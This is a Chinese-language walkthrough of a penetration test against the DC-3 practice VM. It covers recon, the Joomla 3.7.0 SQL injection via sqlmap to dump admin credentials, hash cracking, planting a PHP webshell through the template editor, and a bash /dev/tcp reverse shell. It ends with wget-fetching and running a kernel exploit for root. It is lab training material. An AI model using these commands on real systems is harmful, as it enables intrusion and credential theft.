> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/7CFy2Q4I7SD0QREbDVdV-A)

01 项目安装
-------

首先咱们需要将 DC-3 的靶机下载，并安装到咱们的靶机上

下载地址是：https://www.five86.com/dc-3.html

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mAGwicnD6hibrOvrvicHiapKUQFqCWKq610aff0y6YnwO8ibPLg3ibcyTgfKg/640?wx_fmt=png)

进入页面点击`here` 进行下载

下载好之后，导入咱们的虚拟机

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mem4k9IVSGAjVicfLO191dR9KtvBtpjhUeCRib51xncOB3OicCHBAD1libw/640?wx_fmt=png)

看到这个页面，表示我们靶机安装成功，接下来就是攻略掉它，拿到最高权限

02 信息收集
-------

首先我们得知道咱们靶机的 ip，和信息，进入我们的 kali 执行下面代码

```
#获取ip地址
netdiscover -r  192.168.1.0/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mB7skOJOM7znObagvXkNdU1mv3c3r8gCcm3ic7iafzQjX8NMajicmflMYg/640?wx_fmt=png)

拿到靶机地址

kali 执行

```
#获取靶机端口开放信息
nmap -A   192.168.1.161 -p1-65535
```

可以查看到靶机的端口信息

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mwHOBrfPrab28x2ribIa63fRbibGiagNr3G8odMfJoKZJmdLEvSXnxu3NQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mognTGJDLz94TpyIuEiaoPibojTXpbCoADj5ZgoEdQ6GsKxJWvZOERspg/640?wx_fmt=gif)

可以看到靶机开启了 80 端口，页面访问一下

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mognTGJDLz94TpyIuEiaoPibojTXpbCoADj5ZgoEdQ6GsKxJWvZOERspg/640?wx_fmt=gif)![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mXOdOtVKFRWrnxdx0xdVVaU33ZBYFkCtcZfMhAPRxsZFALenl8lZIrw/640?wx_fmt=png)

可以访问成功

执行命令，扫描后台地址

```
dirb http://192.168.1.116
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mydicy5xtzFC5YeibtRsOgFwxkb60RwnL67WXVTZS3e8jEXDZCQ4xxibSg/640?wx_fmt=png)

可以看到后台地址是：**http://192.168.1.116/administrator/**

访问一下

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mDicdQlgmDic7k6kJPVa5WoGysgMvQv31vnDjODrYdNMiapq74XyeLxOHA/640?wx_fmt=png)

可以看到系统是三大 CMS 系统之一的`Joomla`

03 Joomla 扫描器 joomscan
----------------------

既然知道了这个系统是 Joomla 搭建的，那咱们可以使用 **joomscan** 扫描器，因为这个扫描器就是为了专门扫描 Joomla 而生的

首先我们需要在 kali 中安装  **joomscan**

执行

```
#安装命令
apt-get install joomscan 
#可以看到安装的版本信息
joomscan -version
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mXu07s5eR4v5cAkqJt4ibvdoABCaRj7FnUv5w2uRGzSMQKPQsNoYGWsQ/640?wx_fmt=png)

在 kali 中执行，获取 joomla 的指纹信息

```
joomscan -u http://192.168.102.116/administrator/
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mVNVMQUutDpKW7gYoc2bCbM9BGK4rXyQzDFicSJuQXGUS1uNGVmLDGaw/640?wx_fmt=png)

可以看到当前 Joomla 的版本号是 3.7.0

04 漏洞利用
-------

既然我们知道了 Joomla 的版本号，那我们可以使用 searchsploit ，查看当前版本有哪些可以值得利用的漏洞

在 kaili 中执行

```
searchsploit   Joomla 3.7.0
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mFKJMiaO0sHMZZCK4BdLHdtCwqkFZQ9icsEicTcCW4xTyRXJ1mEnicnWblA/640?wx_fmt=png)

可以看到有注入 sql 注入漏洞，在 42033 当中

这里绝对路径是

```
/usr/share/exploitdb/exploits/
```

执行

```
cat  /usr/share/exploitdb/exploits/php/webapps/42033.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61m6BzhgSL26WWCkkyiaibvgS59s5icS2thhJW4QBkKgFmAZmzXPzMsXxhEg/640?wx_fmt=png)

可以看到 sql 注入脚本

05 sql 注入
---------

既然我们获得了 sql 注入脚本，那直接可以拿过来使用，记得修改下靶机的 Ip 地址

```
#获取当前数据库
sqlmap -u"http://192.168.1.116//index.php?option=com_fields&view=

fields&layout=modal&list[fullordering]=updatexml"--risk=3--level=5--

random-agent--dbs-p list[fullordering]
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mZeZddepGcwX3Llj4kD2MazibJ9WX1fQKxiaxTOqmtZ8IQFlaFdovaVgA/640?wx_fmt=png)

可以看到数据库为`oomladb`，知道了数据库，接下来获取一下表

```
#获取表
sqlmap -u"http://192.168.1.116//index.php?option=com_fields&view=

fields&layout=modal&list[fullordering]=updatexml"--risk=3--level=5--

random-agent-D joomladb --tables-p list[fullordering]
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mKIMWUyTkjYR14icuhoIjlFrDvickvOhqQhic1YM7UJNqDVTP65xiaS2SXw/640?wx_fmt=png)

可以看到有个`#__users`的表，查看一下，一般登录数据都会存放在这个表中

```
#获取字段
sqlmap -u"http://192.168.1.116//index.php?option=com_fields&view=

fields&layout=modal&list[fullordering]=updatexml"--risk=3--level=5--

random-agent-D"joomladb"-T"#__users"  -columns  -p list[fullordering]
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mognTGJDLz94TpyIuEiaoPibojTXpbCoADj5ZgoEdQ6GsKxJWvZOERspg/640?wx_fmt=gif)![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mfQgHhSta6p9dq2oGydjoG8rmvn8qESvEITciceDHvEwOjZeOTc197Ew/640?wx_fmt=png)

获取到用户表的字段，接下来就是获取数据

```
#获取数据
sqlmap -u"http://192.168.1.116//index.php?option=com_fields&view=

fields&layout=modal&list[fullordering]=updatexml"--risk=3--level=5--

random-agent-D"joomladb"-T"#__users"  -C “name,password”--dump  

-p list[fullordering]
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61moT2uqWqV3iamSYhfcRzO6OMADiaCiamDx1tpKnT7jshK3CYaMd6MX7O7w/640?wx_fmt=png)

获取到账户名和密码

```
账户：admin
密码：$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kW

FlfB1Zu
```

可是密码加密的，需要我们解密下

创建一个 pa.txt 文件，将密码放入其中，保存

```
vim pa.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mPzSWPtprcbMzeGHwiaLGcBtJyzcqhviaTp7HJNjuJTjzfvtOvkQtbKDA/640?wx_fmt=png)

执行

```
john pa.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mL9Cy4hG8mJoxS2spFyl8X4qBKd79rlGDhTqsSt1jXkVFKKTjgfULQw/640?wx_fmt=png)

可以获取解密后的密码是：snoopy

接着去后台登录一下

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mEic6y8HeCHcgJgAHAuSsibRoeFgUf9SeoKy57b6tuLXlUcmz6z89iciajQ/640?wx_fmt=png)

登录成功！

06 木马写入
-------

在后台多浏览一下，发现看到 Templates 模块下有 php 文件，那么这个地方可以写入木马

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mmXZRulH3MYPrkD8MHicUK3qROBk4c2NaBs4KHeTol6O6qtR2DaI6XNA/640?wx_fmt=png)

常见一个新的 PHP 文件，写入木马尝试一下

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mRZEcBsnFq8euldD5reCiaXVI36cTo6TRkN3XTk1iaOCibznt8Rhaibzo5Q/640?wx_fmt=png)

发现写入木马成功

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mSRrjiayMzuyNP0MrnVoPpKJh815VGHicTErJxrTgOcm154Rh1T75bzsw/640?wx_fmt=png)

根据页面的信息，获取文件的目录是:http://192.168.1.116/templates/beez3/html/

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61m4JGkPlq276VkE00nohKuujO5iciaLwAZA4Cib7qOplBTnib5DyybYlduWw/640?wx_fmt=png)

所以获取到木马的地址是:http://192.168.1.116/templates/beez3/html/op.php，使用蚁剑连接一下

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mblym9TZGLBnjvGfCtgiaH22Gxt5mkgOgnpC3wcZ2Wvc8jhLsM53pczw/640?wx_fmt=png)

连接成功

这个时候我们需要反弹 shell 一下

在 kali 中执行

```
#使用nc监听1234端口
nc-lvvp1234
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mZrv7icYJtHc17l0PFJ3vvDwaFEsXr51z6b82sPqtlEBCicVLTJsicQUow/640?wx_fmt=png)

在蚁剑的终端执行

```
bash-c'bash -i >& /dev/tcp/192.168.1.117/1234 0>&1'
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mdjhutHZhnyZibpL3HeztBVRWsS4ky8pPF3VdGPStq6mZMLicU56wbyiaw/640?wx_fmt=png)

我们在回到 kali 中可以看到

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mRFCqY9wG14T91s5QibdQWbqmpCmkSKAHUnvUibUoJt4FnyUdM3WJwpvg/640?wx_fmt=png)

这时候拿到了 shell

07 服务器操作
--------

现在咱们就需要进行提权操作，可是执行一圈之后发现很多提权操作都无法进行

sudo -l 没有权限执行

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mOVpyxVjSvG52sDs6AEYDggW7yrPS5fuZqp1SAjic6MKn4HQ9VRzT8ug/640?wx_fmt=png)

在服务器上查看一圈之后，看到了两个信息

执行下面代码，可以看到靶机的服务器版本号

```
#查看版本
cat /proc/version

Linux version 4.4.0-21-generic (buildd@lgw01-06) (gcc version 5.3.1

20160413 (Ubuntu 5.3.1-14ubuntu2) ) #37-Ubuntu SMP Mon Apr 18

18:34:49 UTC 2016
www-data@DC-3:/var/www/html/templates/beez3/html$ 

#查看发行版信息
cat /etc/issue

Ubuntu 16.04 LTS \n \l
```

可以获取到靶机服务器的版本信息是 ：Ubuntu 16.04, 看看是否有执行漏洞

在 kali 中执行

```
searchsploit Ubuntu 16.04
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mzH47Af2bYXBTUMEMyGvY0Q31IqKTg0diahRYgviap7ssKelX4Kq5qnGg/640?wx_fmt=png)

可以看到有很多漏洞利用，在这里我们使用 39772.txt 这个漏洞

执行

```
cat  /usr/share/exploitdb/exploits/linux/local/39772.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mvFv7OEsS8dzNVYvkiaXaIVjozQICkibSIPiakV1ibcFyzgDnsqytsGR7jA/640?wx_fmt=png)

可以看到提示说让我们去下载一个 exp

下载之后，首先把 exp 放在 kali 中

然后执行命令

```
#使用python开启了一个http服务
python -m SimpleHTTPServer 9000
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61m76CUiaAdEdEYPqj1dzibQjeZQTCCcmTH6bXYiaUxZ1HeYhxPKjPfoNjjw/640?wx_fmt=png)

然后在靶机 shell 中执行

```
wget http://192.168.1.117:9000/39772.zip(ip是kail的ip)
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mmOQibDVNUYpB1HAklFkVHica0kAdLicxa0ibuqAXibBTW3hQ3Y6nVQ3tvMw/640?wx_fmt=png)

可以看到上传成功

08 提权
-----

首先解压 exp

```
unzip 39772.zip
cd 39772
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mbDbEicibmoaV4YzFTfzYKv0a4N8TlIKwqAx9U8hLXehxMOsq3Dz6A95g/640?wx_fmt=png)

解压之后，可以看到两个 tart 文件，解压 exploit.tar

```
tar –xvf exploit.tar
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mxX6Y2ibhvp3cicczjLflam5sWf8d7qQMkHsJVTNM3npqhjjfObOC8BCw/640?wx_fmt=png)

解压成功

```
cd ebpf_mapfd_doubleput_exploit
```

执行

```
#编译文件
./compile.sh
```

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mXCfrciaHFvH6v2gnJwo9mEWH02zEorOgXJsvHDLxl4o6icyzM7GbZZhg/640?wx_fmt=png)

执行

```
./doubleput
```

这个就是最终的提权脚本

执行成功之后，他会提示 60s 之后会弹出 root 的 shell

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61maoOrCicLs5InsbUcXbu2XVNIsuyhd9Cj3WMwEyFTQic5Ms7UnRbB4UWg/640?wx_fmt=png)

等一下之后，执行：whoami，发现提权成功

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mwM3b52UK2LkuEqcW6q7moY5OdtFLkQA57BbIT7sCWvGKQA8eJsYOkA/640?wx_fmt=png)

在 root 目录下获取最终目标

![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mJYPtRg5Tpm0FfdKxjXc3RBJ0MkXGJwhOSlfM2GH2mQq4MUs1hbkb3w/640?wx_fmt=png)

渗透成功

09 总结
-----

1.  我们看到系统站点是 Joomla 时，我们可以使用扫描器 joomscan
    
2.  我们可以通过指纹识别后的结果，通过 searchsploit 进行漏洞查找，从而进行漏洞利用
    
3.  熟练掌握反弹 shell 的各种方法
    
4.  通过网络服务可以将文件下载到靶机当中
    

-END-

![](https://mmbiz.qpic.cn/mmbiz_gif/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61miagSh8mlA1Yb2riaSibiaTE9wF0zoZfPOTIgSMKrvTjM6lSBWwSiaGx584g/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_jpg/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mrMsqiaz5Is1EjiayDv4AFiaFibBAdZjwTuhlVF0NaOM1A9DXx0qy48se8Q/640?wx_fmt=jpeg)

微信号：Zero-safety

- 扫码关注我们 -

带你领略不一样的世界

![](https://mmbiz.qpic.cn/mmbiz_gif/eqGGHicCG3MYLsiafhuCAGuOSuIhKap61mOnuN32N92RN4WvG94sL3diaBGSaFNMh2ZQXtibB0SiaLtyCuk6e6EKYoQ/640?wx_fmt=gif)